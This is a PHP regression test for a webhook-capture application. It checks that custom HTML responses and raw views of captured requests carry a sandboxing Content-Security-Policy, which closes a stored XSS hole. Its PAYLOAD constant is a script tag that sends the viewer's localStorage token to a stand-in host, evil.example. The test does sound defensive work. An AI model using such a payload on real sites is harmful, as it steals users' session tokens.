<?php

use Illuminate\Http\Response;

/**
 * Regression: the custom response of a webhook URL (and the raw view of captured
 * requests) is attacker-controlled HTML served from the application's origin.
 * It used to run scripts with access to the viewer's localStorage (stored XSS).
 */
class WebhookResponseSandboxTest extends TestCase
{
    private const PAYLOAD = '<script>fetch("//evil.example/?t="+localStorage.token)</script>';

    public function testCustomHtmlResponseIsSandboxed()
    {
        $tokenId = $this->json('POST', 'token', [
            'default_content_type' => 'text/html',
            'default_content' => self::PAYLOAD,
        ])->assertStatus(Response::HTTP_CREATED)->json()['uuid'];

        $response = $this->get($tokenId);

        // Functionality is preserved: same status, content type and body ...
        $response->assertStatus(Response::HTTP_OK);
        $this->assertStringStartsWith('text/html', $response->headers->get('Content-Type'));
        $this->assertSame(self::PAYLOAD, $response->getContent());

        // ... but browsers render it in a sandbox (opaque origin, no scripts).
        $this->assertSame('sandbox', $response->headers->get('Content-Security-Policy'));
        $this->assertSame('nosniff', $response->headers->get('X-Content-Type-Options'));
    }

    public function testCustomStatusPathResponseIsSandboxed()
    {
        $tokenId = $this->json('POST', 'token', ['default_content_type' => 'text/html'])->json()['uuid'];

        $response = $this->post("$tokenId/404");

        $response->assertStatus(Response::HTTP_NOT_FOUND);
        $this->assertSame('sandbox', $response->headers->get('Content-Security-Policy'));
    }

    public function testRawViewOfCapturedRequestIsSandboxed()
    {
        $tokenId = $this->json('POST', 'token')->json()['uuid'];
        $this->call('POST', $tokenId, [], [], [], ['CONTENT_TYPE' => 'text/html'], self::PAYLOAD);
        $requestId = $this->json('GET', "token/$tokenId/requests")->json()['data'][0]['uuid'];

        $response = $this->get("token/$tokenId/request/$requestId/raw");

        $response->assertStatus(Response::HTTP_OK);
        $this->assertSame(self::PAYLOAD, $response->getContent());
        $this->assertStringStartsWith('text/plain', $response->headers->get('Content-Type'));
        $this->assertSame('sandbox', $response->headers->get('Content-Security-Policy'));
        $this->assertSame('nosniff', $response->headers->get('X-Content-Type-Options'));
    }

    public function testSandboxPolicyIsConfigurable()
    {
        config(['app.webhook_response_csp' => 'sandbox allow-scripts']);
        $tokenId = $this->json('POST', 'token')->json()['uuid'];
        $this->assertSame('sandbox allow-scripts', $this->get($tokenId)->headers->get('Content-Security-Policy'));

        config(['app.webhook_response_csp' => '']);
        $response = $this->get($tokenId);
        $this->assertFalse($response->headers->has('Content-Security-Policy'));
        $this->assertSame('nosniff', $response->headers->get('X-Content-Type-Options'));
    }
}
